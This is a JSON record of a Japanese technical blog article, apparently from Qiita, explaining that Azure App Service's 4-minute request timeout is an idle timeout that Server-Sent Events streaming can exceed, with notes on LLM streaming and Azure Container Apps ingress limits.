{
  "fetched_at": "2025-12-09T15:24:45.712431",
  "articles": [
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:19\">\n<span id=\"-はじめに\" class=\"fragment\"></span><a href=\"#-%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>🌟 はじめに</h1>\n<p data-sourcepos=\"2:1-4:87\">この記事は <a href=\"https://qiita.com/advent-calendar/2025/microsoft-azure-tech\">Microsoft Azure Tech Advent Calendar 2025</a> 9 日目の記事です。<br>\nあくまでも現時点での公開情報と実際に動作させてみて分かったことベースでの記載となります。<br>\n将来的に動作が変わる可能性があることはご承知おきください。</p>\n<h1 data-sourcepos=\"6:1-6:11\">\n<span id=\"-tldr\" class=\"fragment\"></span><a href=\"#-tldr\"><i class=\"fa fa-link\"></i></a>⚡ TL;DR</h1>\n<ul data-sourcepos=\"8:1-11:0\">\n<li data-sourcepos=\"8:1-8:104\">App Service のリクエストタイムアウト 4 分は正確にはアイドルタイムアウト。</li>\n<li data-sourcepos=\"9:1-9:48\">SSE なら 4分 超えることができる。</li>\n<li data-sourcepos=\"10:1-11:0\">LLM と連携するなら <code>stream=true</code> として SSE を使うのがいいんじゃないでしょうか。</li>\n</ul>\n<h1 data-sourcepos=\"12:1-12:72\">\n<span id=\"️-azure-app-service-におけるリクエストタイムアウト\" class=\"fragment\"></span><a href=\"#%EF%B8%8F-azure-app-service-%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%BF%E3%82%A4%E3%83%A0%E3%82%A2%E3%82%A6%E3%83%88\"><i class=\"fa fa-link\"></i></a>⏱️ Azure App Service におけるリクエストタイムアウト</h1>\n<p data-sourcepos=\"14:1-14:205\">App Service では アプリケーションが約 240 秒以内 (Windows アプリでは 230 秒、Linux アプリでは 240 秒) に応答が返されない場合 504 Gateway Timeout が発生します。</p>\n<p data-sourcepos=\"16:1-16:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Ffda09815-f43c-4f2f-bb16-8f0aeaef24ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=55205dfd1ab3ac8d82122ae3ad089eaa\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Ffda09815-f43c-4f2f-bb16-8f0aeaef24ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=55205dfd1ab3ac8d82122ae3ad089eaa\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Ffda09815-f43c-4f2f-bb16-8f0aeaef24ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=af264cd4ec60118cceb65712fba4b603 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/fda09815-f43c-4f2f-bb16-8f0aeaef24ab.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"18:1-19:95\">これは App Service と同じプラットフォームで提供される Azure Functions についても同様です。<br>\nまた、この動作は良く知られた仕様で下記の FAQ にも記載があります。</p>\n<p data-sourcepos=\"21:1-21:231\"><a href=\"https://learn.microsoft.com/ja-jp/troubleshoot/azure/app-service/web-apps-performance-faqs#why-does-my-request-time-out-after-230-seconds\" rel=\"nofollow noopener\" target=\"_blank\">アプリケーションのパフォーマンスに関する FAQ - Azure | Microsoft Learn</a></p>\n<blockquote data-sourcepos=\"23:1-24:446\">\n<p data-sourcepos=\"23:3-24:446\">230 秒後に要求がタイムアウトになるのはなぜですか?<br>\nAzure Load Balancer には、4 分という既定のアイドル タイムアウト設定があります。 この設定は一般的にウェブ リクエストのための妥当な応答時間の制限です。 そのため、アプリケーションが約 240 秒以内 (Windows アプリでは 230 秒、Linux アプリでは 240 秒) に応答が返されない場合、App Service はクライアントにタイムアウトを返します。</p>\n</blockquote>\n<h1 data-sourcepos=\"26:1-26:35\">\n<span id=\"-4分の壁を超える方法\" class=\"fragment\"></span><a href=\"#-4%E5%88%86%E3%81%AE%E5%A3%81%E3%82%92%E8%B6%85%E3%81%88%E3%82%8B%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>🧱 4分の壁を超える方法</h1>\n<p data-sourcepos=\"28:1-28:166\">そもそも HTTP要求に対してで 4 分かかるのを是とするかどうかはおいといて、4 分を超える処理を実現する方法を考えます。</p>\n<h2 data-sourcepos=\"30:1-30:44\">\n<span id=\"-一般的なワークアラウンド\" class=\"fragment\"></span><a href=\"#-%E4%B8%80%E8%88%AC%E7%9A%84%E3%81%AA%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%A2%E3%83%A9%E3%82%A6%E3%83%B3%E3%83%89\"><i class=\"fa fa-link\"></i></a>🔍 一般的なワークアラウンド</h2>\n<p data-sourcepos=\"32:1-32:276\">このような場合の対策としては一般的には HTTP 202 応答を用いた「非同期要求-応答パターン」を用いることができます。また、それを実現するフレームワークとして Durable Functions などが提供されています。</p>\n<ul data-sourcepos=\"35:1-38:0\">\n<li data-sourcepos=\"35:1-36:0\">\n<p data-sourcepos=\"35:3-35:167\"><a href=\"https://learn.microsoft.com/ja-jp/azure/architecture/patterns/async-request-reply\" rel=\"nofollow noopener\" target=\"_blank\">非同期要求-応答パターン - Azure Architecture Center | Microsoft Learn</a></p>\n</li>\n<li data-sourcepos=\"37:1-38:0\">\n<p data-sourcepos=\"37:3-37:202\"><a href=\"https://learn.microsoft.com/ja-jp/azure/azure-functions/durable/durable-functions-overview?tabs=in-process%2Cnodejs-v3%2Cv1-model&amp;pivots=csharp\" rel=\"nofollow noopener\" target=\"_blank\">Durable Functions の概要 - Azure | Microsoft Learn</a></p>\n</li>\n</ul>\n<h2 data-sourcepos=\"39:1-39:59\">\n<span id=\"️-タイムアウトはどこで発生するのか\" class=\"fragment\"></span><a href=\"#%EF%B8%8F-%E3%82%BF%E3%82%A4%E3%83%A0%E3%82%A2%E3%82%A6%E3%83%88%E3%81%AF%E3%81%A9%E3%81%93%E3%81%A7%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>🕵️ タイムアウトはどこで発生するのか</h2>\n<p data-sourcepos=\"41:1-42:508\">前述の FAQ に記載のとおり、この 4 分という制限は Azure Loadbalancer の構成に起因するものとなります。<br>\nHTTP応答自体は返却されているので、この 4 分を下回るように、App Service 側のミドルウェアが返却しているものと推測されます。Windows 環境と Linux 環境で10秒のずれがあることから 下記のブログ記事を引用するとWorker 側のミドルウェア(Windows の場合は IIS、Linux の場合は <a href=\"https://devblogs.microsoft.com/dotnet/bringing-kestrel-and-yarp-to-azure-app-services/\" rel=\"nofollow noopener\" target=\"_blank\">Yarp + Kestrel</a>)である可能性が考えられます。</p>\n<p data-sourcepos=\"44:1-44:294\"><a href=\"https://azure.github.io/jpazpaas/2023/05/10/Appservice-components.html#2-app-service-%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E6%A7%8B%E6%88%90\" rel=\"nofollow noopener\" target=\"_blank\">App Service を構成する主要な要素とそれぞれの役割 - Japan PaaS Support Team Blog</a></p>\n<p data-sourcepos=\"46:1-46:157\">次にロード バランサー側のドキュメントを見てます。以下のドキュメントに  <strong>4 分</strong> というキーワードがあります。</p>\n<p data-sourcepos=\"48:1-48:255\"><a href=\"https://learn.microsoft.com/ja-jp/azure/load-balancer/load-balancer-tcp-idle-timeout?tabs=tcp-reset-idle-portal\" rel=\"nofollow noopener\" target=\"_blank\">ロード バランサーの TCP リセットおよびアイドル タイムアウトを構成する - Azure Load Balancer | Microsoft Learn</a></p>\n<blockquote data-sourcepos=\"49:1-49:256\">\n<p data-sourcepos=\"49:3-49:256\">Azure Load Balancer の規則には、Load Balancer 規則、アウトバウンド規則、インバウンド NAT 規則に対して、4 分から 100 分の既定のタイムアウト範囲が設定されています。 既定の設定は 4 分です。</p>\n</blockquote>\n<p data-sourcepos=\"51:1-52:149\">ロード バランサーの仕組みとしては変更可能のようですが、App Service プラットフォームを構成するロード バランサー自体をユーザーが変更することはできないため、4分を変更することはできません。<br>\nここで気になるのはロード バランサー側のドキュメントには <strong>アイドル タイムアウト</strong> と記載されています。</p>\n<p data-sourcepos=\"54:1-54:133\">アイドル タイムアウトってことはパケットが通り続ければ接続は維持されることが見込まれます。</p>\n<h3 data-sourcepos=\"56:1-56:10\">\n<span id=\"検証\" class=\"fragment\"></span><a href=\"#%E6%A4%9C%E8%A8%BC\"><i class=\"fa fa-link\"></i></a>検証</h3>\n<p data-sourcepos=\"58:1-58:49\">以下の2つのAPIを用意してみました。</p>\n<ul data-sourcepos=\"60:1-61:0\">\n<li data-sourcepos=\"60:1-61:0\">\n<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events\" rel=\"nofollow noopener\" target=\"_blank\">Server-sent events(SSE)</a> を返す API</li>\n</ul>\n<p data-sourcepos=\"62:1-62:93\"><code>content-type</code> は <code>text/event-stream</code> として指定回数だけイベントを返すやつ</p>\n<p data-sourcepos=\"64:1-64:94\"><iframe id=\"qiita-embed-content__4593f9079cd16802978f79802ef1bfc7\" src=\"https://qiita.com/embed-contents/github-blob#qiita-embed-content__4593f9079cd16802978f79802ef1bfc7\" data-content=\"https%3A%2F%2Fgithub.com%2FgeorgeOsdDev%2Fjpazpaas-sample-app-node%2Fblob%2Fmain%2Fsrc%2Froutes%2Fstream.ts%23L7-L34\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\">\n</iframe>\n</p>\n<p data-sourcepos=\"66:1-66:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F0d6c060a-7aee-4de2-9123-89ecdebb50d8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=407f4a15ae91370fbe95e3b9d36b958f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F0d6c060a-7aee-4de2-9123-89ecdebb50d8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=407f4a15ae91370fbe95e3b9d36b958f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F0d6c060a-7aee-4de2-9123-89ecdebb50d8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7ec4a4d5afe5222e0a93aebeb77e2e54 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/0d6c060a-7aee-4de2-9123-89ecdebb50d8.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"68:1-68:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F49d5068f-2e52-4b83-93db-06a40a1b86e4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=23060b76f0e4a0506932d395f7adae13\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F49d5068f-2e52-4b83-93db-06a40a1b86e4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=23060b76f0e4a0506932d395f7adae13\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F49d5068f-2e52-4b83-93db-06a40a1b86e4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=dd6f5719b285f2b469c81fdc4485a2f0 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/49d5068f-2e52-4b83-93db-06a40a1b86e4.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"70:1-71:0\">\n<li data-sourcepos=\"70:1-71:0\">単純に応答スループットが遅い API</li>\n</ul>\n<p data-sourcepos=\"72:1-72:122\"><code>content-type</code> は <code>text/plain; charset=UTF-8</code> だけど、応答が書き終わるまで指定秒スリープするやつ</p>\n<p data-sourcepos=\"74:1-74:95\"><iframe id=\"qiita-embed-content__f5a3fe6418844c7659e542fffeceddb6\" src=\"https://qiita.com/embed-contents/github-blob#qiita-embed-content__f5a3fe6418844c7659e542fffeceddb6\" data-content=\"https%3A%2F%2Fgithub.com%2FgeorgeOsdDev%2Fjpazpaas-sample-app-node%2Fblob%2Fmain%2Fsrc%2Froutes%2Fstream.ts%23L61-L87\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\">\n</iframe>\n</p>\n<p data-sourcepos=\"76:1-76:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fe4041772-cfd4-4740-87e9-429787410363.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=06aa64e69ee4a239ce9c9474b4cd7267\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fe4041772-cfd4-4740-87e9-429787410363.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=06aa64e69ee4a239ce9c9474b4cd7267\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fe4041772-cfd4-4740-87e9-429787410363.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8d1399ace784f3eb8de7f43db1962273 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/e4041772-cfd4-4740-87e9-429787410363.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"78:1-78:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fea0a6790-2ff0-4deb-83f5-144807d77bd9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=db30dfd11dfd1fafe7b450a769a50c78\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fea0a6790-2ff0-4deb-83f5-144807d77bd9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=db30dfd11dfd1fafe7b450a769a50c78\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fea0a6790-2ff0-4deb-83f5-144807d77bd9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ccb224f3a5702ef4e92931883a67a15e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/ea0a6790-2ff0-4deb-83f5-144807d77bd9.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"80:1-80:16\">\n<span id=\"検証結果\" class=\"fragment\"></span><a href=\"#%E6%A4%9C%E8%A8%BC%E7%B5%90%E6%9E%9C\"><i class=\"fa fa-link\"></i></a>検証結果</h3>\n<p data-sourcepos=\"82:1-82:273\">どちらの API も 250 秒かけて完了していることが確認できました。すなわち、4分 というのはあくまでもアイドル タイムアウトで、その間パケットが流れていれば切断されて 504 になることはありません。</p>\n<p data-sourcepos=\"84:1-84:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fbc51897d-7985-4fd9-96a7-1f5d665f33ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4320b42e089eacc88bbc67198eca113f\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fbc51897d-7985-4fd9-96a7-1f5d665f33ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4320b42e089eacc88bbc67198eca113f\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2Fbc51897d-7985-4fd9-96a7-1f5d665f33ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2f86a6d92380c0d69eaf86dda7f430ea 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/bc51897d-7985-4fd9-96a7-1f5d665f33ab.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"86:1-86:32\">\n<span id=\"server-sent-event-といえば\" class=\"fragment\"></span><a href=\"#server-sent-event-%E3%81%A8%E3%81%84%E3%81%88%E3%81%B0\"><i class=\"fa fa-link\"></i></a>Server Sent Event といえば</h1>\n<p data-sourcepos=\"88:1-89:95\">ここでようやく昨今の LLM 連携アプリケーションに話がつながります。<br>\nLLMの応答も <code>stream=true</code> とすることで SSE で応答を得ることができます。</p>\n<p data-sourcepos=\"91:1-91:118\"><a href=\"https://platform.openai.com/docs/guides/streaming-responses?api-mode=responses\" rel=\"nofollow noopener\" target=\"_blank\">Streaming API responses - OpenAI API</a></p>\n<p data-sourcepos=\"93:1-93:234\"><a href=\"https://learn.microsoft.com/ja-jp/azure/ai-foundry/openai/latest?view=foundry-classic#azurecreatechatcompletionstreamresponse\" rel=\"nofollow noopener\" target=\"_blank\">Azure OpenAI の Microsoft Foundry Models v1 REST API リファレンス - Azure OpenAI | Microsoft Learn</a></p>\n<p data-sourcepos=\"95:1-95:254\">App Service 等にデプロイしたアプリケーションから LLM の APIを呼び出し、応答を加工してさらにクライアントにSSEで返却することで LLM からの応答が巨大になっても大丈夫ということですね。</p>\n<p data-sourcepos=\"97:1-98:147\">参考<br>\n<a href=\"https://zenn.dev/microsoft/articles/azure-openai-stream-azure-function\" rel=\"nofollow noopener\" target=\"_blank\">Azure OpenAIの返答をAzure Functionを中継してStream(SSE)したい</a></p>\n<p data-sourcepos=\"100:1-101:203\">また、最近 サイドカーとしてで Phi-4 を SLM として動作させるチュートリアルがあります。<br>\n<a href=\"https://learn.microsoft.com/ja-jp/azure/app-service/tutorial-ai-slm-expressjs\" rel=\"nofollow noopener\" target=\"_blank\">チュートリアル: SLM 拡張機能を使った Express.js チャットボット - Azure App Service | Microsoft Learn</a></p>\n<p data-sourcepos=\"103:1-103:141\">ここでも SLM の API をストリームとして呼び出し、クライアントへも SSE で中継する実装となっています。</p>\n<p data-sourcepos=\"105:1-105:141\"><iframe id=\"qiita-embed-content__29399f58237fa3dd5eeac0bb2a8cfb29\" src=\"https://qiita.com/embed-contents/github-blob#qiita-embed-content__29399f58237fa3dd5eeac0bb2a8cfb29\" data-content=\"https%3A%2F%2Fgithub.com%2FAzure-Samples%2Fai-slm-in-app-service-sidecar%2Fblob%2Fmain%2Fuse_sidecar_extension%2Fexpressapp%2Fsrc%2Fservices%2Fslm_service.js%23L19-L40\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\">\n</iframe>\n</p>\n<p data-sourcepos=\"107:1-107:165\">Phi-4 サイドカーちょっと試してみましたが SKU を渋ると応答がとてつもなく遅い<sup><a href=\"#fn-1\" id=\"fnref-1\">1</a></sup>のでストリーム化は必須と思われます。</p>\n<h1 data-sourcepos=\"111:1-111:37\">\n<span id=\"azure-container-appsはどうなの\" class=\"fragment\"></span><a href=\"#azure-container-apps%E3%81%AF%E3%81%A9%E3%81%86%E3%81%AA%E3%81%AE\"><i class=\"fa fa-link\"></i></a>Azure Container Appsはどうなの</h1>\n<p data-sourcepos=\"113:1-113:69\">Azure Container Apps についても同様の制限があります。</p>\n<p data-sourcepos=\"115:1-115:140\"><a href=\"https://learn.microsoft.com/ja-jp/azure/container-apps/ingress-overview#http\" rel=\"nofollow noopener\" target=\"_blank\">Azure Container Apps でのイングレス | Microsoft Learn</a></p>\n<blockquote data-sourcepos=\"117:1-117:46\">\n<p data-sourcepos=\"117:3-117:46\">要求のタイムアウトは 240 秒です</p>\n</blockquote>\n<p data-sourcepos=\"119:1-119:101\">ただし、Premium イングレスを用いることで上限を緩和することが可能です。</p>\n<p data-sourcepos=\"121:1-121:211\"><a href=\"https://learn.microsoft.com/ja-jp/azure/container-apps/ingress-environment-configuration?tabs=azure-cli#advanced-ingress-settings\" rel=\"nofollow noopener\" target=\"_blank\">Azure Container Apps 環境でイングレスを構成する | Microsoft Learn</a></p>\n<p data-sourcepos=\"123:1-123:119\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F1519738c-1d0b-475f-a538-6635d2621b1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9b987b060691b5100fbc22b4cd899e57\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F1519738c-1d0b-475f-a538-6635d2621b1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9b987b060691b5100fbc22b4cd899e57\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4914%2F1519738c-1d0b-475f-a538-6635d2621b1e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4d712e9d9ea67314e757f270dbc820a8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/1519738c-1d0b-475f-a538-6635d2621b1e.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"125:1-125:306\">これは Azure Containe Apps の場合 <a href=\"https://learn.microsoft.com/ja-jp/azure/container-apps/custom-virtual-networks?tabs=workload-profiles-env#managed-resources\" rel=\"nofollow noopener\" target=\"_blank\">マネージドリソース</a> として専用のロードバランサーが用意されるため変更可能なものと推測できます。</p>\n<section class=\"footnotes\">\n<ol>\n<li id=\"fn-1\">\n<p data-sourcepos=\"109:8-109:197\">P2mv3 レベル以上が推奨されています。<a href=\"https://learn.microsoft.com/ja-jp/azure/app-service/tutorial-ai-slm-fastapi#how-does-pricing-tier-affect-the-performance-of-the-slm-sidecar\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://learn.microsoft.com/ja-jp/azure/app-service/tutorial-ai-slm-fastapi#how-does-pricing-tier-affect-the-performance-of-the-slm-sidecar</a> <a href=\"#fnref-1\" class=\"\">↩</a></p>\n</li>\n</ol>\n</section>\n",
      "body": "# 🌟 はじめに\nこの記事は [Microsoft Azure Tech Advent Calendar 2025](https://qiita.com/advent-calendar/2025/microsoft-azure-tech) 9 日目の記事です。\nあくまでも現時点での公開情報と実際に動作させてみて分かったことベースでの記載となります。\n将来的に動作が変わる可能性があることはご承知おきください。\n\n# ⚡ TL;DR\n\n- App Service のリクエストタイムアウト 4 分は正確にはアイドルタイムアウト。\n- SSE なら 4分 超えることができる。\n- LLM と連携するなら `stream=true` として SSE を使うのがいいんじゃないでしょうか。\n\n# ⏱️ Azure App Service におけるリクエストタイムアウト\n\nApp Service では アプリケーションが約 240 秒以内 (Windows アプリでは 230 秒、Linux アプリでは 240 秒) に応答が返されない場合 504 Gateway Timeout が発生します。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/fda09815-f43c-4f2f-bb16-8f0aeaef24ab.png)\n\nこれは App Service と同じプラットフォームで提供される Azure Functions についても同様です。\nまた、この動作は良く知られた仕様で下記の FAQ にも記載があります。\n\n[アプリケーションのパフォーマンスに関する FAQ - Azure | Microsoft Learn](https://learn.microsoft.com/ja-jp/troubleshoot/azure/app-service/web-apps-performance-faqs#why-does-my-request-time-out-after-230-seconds)\n\n> 230 秒後に要求がタイムアウトになるのはなぜですか?\nAzure Load Balancer には、4 分という既定のアイドル タイムアウト設定があります。 この設定は一般的にウェブ リクエストのための妥当な応答時間の制限です。 そのため、アプリケーションが約 240 秒以内 (Windows アプリでは 230 秒、Linux アプリでは 240 秒) に応答が返されない場合、App Service はクライアントにタイムアウトを返します。\n\n# 🧱 4分の壁を超える方法\n\nそもそも HTTP要求に対してで 4 分かかるのを是とするかどうかはおいといて、4 分を超える処理を実現する方法を考えます。\n\n## 🔍 一般的なワークアラウンド\n\nこのような場合の対策としては一般的には HTTP 202 応答を用いた「非同期要求-応答パターン」を用いることができます。また、それを実現するフレームワークとして Durable Functions などが提供されています。\n\n\n- [非同期要求-応答パターン - Azure Architecture Center | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/architecture/patterns/async-request-reply)\n\n- [Durable Functions の概要 - Azure | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/azure-functions/durable/durable-functions-overview?tabs=in-process%2Cnodejs-v3%2Cv1-model&pivots=csharp)\n\n## 🕵️ タイムアウトはどこで発生するのか\n\n前述の FAQ に記載のとおり、この 4 分という制限は Azure Loadbalancer の構成に起因するものとなります。\nHTTP応答自体は返却されているので、この 4 分を下回るように、App Service 側のミドルウェアが返却しているものと推測されます。Windows 環境と Linux 環境で10秒のずれがあることから 下記のブログ記事を引用するとWorker 側のミドルウェア(Windows の場合は IIS、Linux の場合は [Yarp + Kestrel](https://devblogs.microsoft.com/dotnet/bringing-kestrel-and-yarp-to-azure-app-services/))である可能性が考えられます。\n\n[App Service を構成する主要な要素とそれぞれの役割 - Japan PaaS Support Team Blog](https://azure.github.io/jpazpaas/2023/05/10/Appservice-components.html#2-app-service-%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E6%A7%8B%E6%88%90)\n\n次にロード バランサー側のドキュメントを見てます。以下のドキュメントに  **4 分** というキーワードがあります。\n\n[ロード バランサーの TCP リセットおよびアイドル タイムアウトを構成する - Azure Load Balancer | Microsoft Learn](https://learn.microsoft.com/ja-jp/azure/load-balancer/load-balancer-tcp-idle-timeout?tabs=tcp-reset-idle-portal)\n> Azure Load Balancer の規則には、Load Balancer 規則、アウトバウンド規則、インバウンド NAT 規則に対して、4 分から 100 分の既定のタイムアウト範囲が設定されています。 既定の設定は 4 分です。\n\nロード バランサーの仕組みとしては変更可能のようですが、App Service プラットフォームを構成するロード バランサー自体をユーザーが変更することはできないため、4分を変更することはできません。\nここで気になるのはロード バランサー側のドキュメントには **アイドル タイムアウト** と記載されています。\n\nアイドル タイムアウトってことはパケットが通り続ければ接続は維持されることが見込まれます。\n\n### 検証\n\n以下の2つのAPIを用意してみました。\n\n- [Server-sent events(SSE)](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events) を返す API\n\n`content-type` は `text/event-stream` として指定回数だけイベントを返すやつ\n\nhttps://github.com/georgeOsdDev/jpazpaas-sample-app-node/blob/main/src/routes/stream.ts#L7-L34\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/0d6c060a-7aee-4de2-9123-89ecdebb50d8.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/49d5068f-2e52-4b83-93db-06a40a1b86e4.png)\n\n- 単純に応答スループットが遅い API\n\n`content-type` は `text/plain; charset=UTF-8` だけど、応答が書き終わるまで指定秒スリープするやつ\n\nhttps://github.com/georgeOsdDev/jpazpaas-sample-app-node/blob/main/src/routes/stream.ts#L61-L87\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/e4041772-cfd4-4740-87e9-429787410363.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/ea0a6790-2ff0-4deb-83f5-144807d77bd9.png)\n\n### 検証結果\n\nどちらの API も 250 秒かけて完了していることが確認できました。すなわち、4分 というのはあくまでもアイドル タイムアウトで、その間パケットが流れていれば切断されて 504 になることはありません。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4914/bc51897d-7985-4fd9-96a7-1f5d665f33ab.png)\n\n# Server Sent Event といえば\n\nここでようやく昨今の LLM 連携アプリケーションに話がつながります。\nLLMの応答も `stream=true` とすることで SSE 